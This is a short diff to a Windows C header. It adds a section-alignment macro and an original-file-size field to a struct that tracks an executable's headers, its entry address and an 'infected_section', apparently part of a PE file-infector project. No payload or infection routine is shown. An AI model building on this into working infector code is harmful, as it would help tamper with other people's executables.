@@ -1,6 +1,11 @@
 #pragma once
 #include <Windows.h>
 
+#define ROUND_TO_SECTION_ALIGNMENT(number){\
+                    number -= number % 0x1000;\
+                    number += 0x1000;\
+                    }
+
 struct Exe_file
 {
     HANDLE handle;
@@ -9,6 +14,7 @@ struct Exe_file
     PIMAGE_NT_HEADERS headers;
     PIMAGE_SECTION_HEADER infected_section;
     DWORD entry_address;
+    DWORD origianal_file_size;
     DWORD file_size;
 };
 
